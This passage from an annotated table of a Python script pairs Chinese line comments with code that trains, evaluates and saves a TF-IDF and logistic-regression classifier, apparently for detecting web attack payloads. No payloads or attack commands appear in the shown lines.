| L0189 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    X_train, X_test, y_train, y_test = train_test_split(texts, labels, test_size=0.22, random_state=args.seed, stratify=labels)</code> |
| L0190 | 计算并保存 &#96;model&#96;（模型），供后续逻辑使用，当前位于函数 main。 | <code>    model = Pipeline([</code> |
| L0191 | 处理向量、相似度或重排结果，属于 RAG 检索链路，当前位于函数 main。 | <code>        ("tfidf", TfidfVectorizer(analyzer="char", ngram_range=(3, 5), min_df=2, max_features=90000, lowercase=True)),</code> |
| L0192 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        ("clf", LogisticRegression(max_iter=2500, class_weight="balanced", C=4.0, n_jobs=None)),</code> |
| L0193 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 main。 | <code>    ])</code> |
| L0194 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    model.fit(X_train, y_train)</code> |
| L0195 | 执行小模型推理并取得预测分数，当前位于函数 main。 | <code>    pred = model.predict(X_test)</code> |
| L0196 | 计算并保存 &#96;acc&#96;（acc），供后续逻辑使用，当前位于函数 main。 | <code>    acc = accuracy_score(y_test, pred)</code> |
| L0197 | 计算并保存 &#96;macro_f1&#96;（macrof1），供后续逻辑使用，当前位于函数 main。 | <code>    macro_f1 = f1_score(y_test, pred, average="macro")</code> |
| L0198 | 计算并保存 &#96;report&#96;（报告），供后续逻辑使用，当前位于函数 main。 | <code>    report = classification_report(y_test, pred, digits=4, zero_division=0)</code> |
| L0199 | 计算并保存 &#96;cm&#96;（cm），供后续逻辑使用，当前位于函数 main。 | <code>    cm = confusion_matrix(y_test, pred, labels=sorted(set(labels)))</code> |
| L0200 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0201 | 计算并保存 &#96;bundle&#96;（bundle），供后续逻辑使用，当前位于函数 main。 | <code>    bundle = {</code> |
| L0202 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        "version": "payload_model_v2_2026_07_01",</code> |
| L0203 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        "created_at": datetime.now().isoformat(timespec="seconds"),</code> |
| L0204 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        "model": model,</code> |
| L0205 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        "labels": sorted(set(labels)),</code> |
| L0206 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        "metrics": {"accuracy": acc, "macro_f1": macro_f1, "sample_count": len(samples), "server_hard_sample_count": len(server_samples)},</code> |
| L0207 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>        "notes": "TF-IDF char ngram + LogisticRegression, trained with synthetic Web payloads and server hard negatives.",</code> |
| L0208 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 main。 | <code>    }</code> |
| L0209 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    joblib.dump(bundle, model_out)</code> |
| L0210 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0211 | 计算并保存 &#96;raw_df&#96;（rawdf），供后续逻辑使用，当前位于函数 main。 | <code>    raw_df = pd.DataFrame({"label": labels, "text": texts})</code> |
| L0212 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    raw_df.to_csv(out_dir / "payload_model_v2_training_samples.csv", index=False, encoding="utf-8-sig")</code> |
| L0213 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    (out_dir / "classification_report.txt").write_text(report, encoding="utf-8")</code> |
| L0214 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    (out_dir / "metrics.json").write_text(json.dumps(bundle["metrics"], ensure_ascii=False, indent=2), encoding="utf-8")</code> |
| L0215 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    pd.DataFrame(cm, index=sorted(set(labels)), columns=sorted(set(labels))).to_csv(out_dir / "confusion_matrix.csv", encoding="utf-8-sig")</code> |
| L0216 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 main。 | <code>    (out_dir / "label_counts.json").write_text(json.dumps(Counter(labels), ensure_ascii=False, indent=2), encoding="utf-8")</code> |
| L0217 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0218 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print("model:", model_out)</code> |
| L0219 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print("samples:", len(samples), "server_hard:", len(server_samples))</code> |
| L0220 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print("accuracy:", round(acc, 5), "macro_f1:", round(macro_f1, 5))</code> |
| L0221 | 记录运行状态或诊断信息，便于日志排障，当前位于函数 main。 | <code>    print(report)</code> |
| L0222 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0223 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0224 | 判断条件是否成立，成立时进入对应处理分支。 | <code>if __name__ == "__main__":</code> |
| L0225 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    main()</code> |
| L0226 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
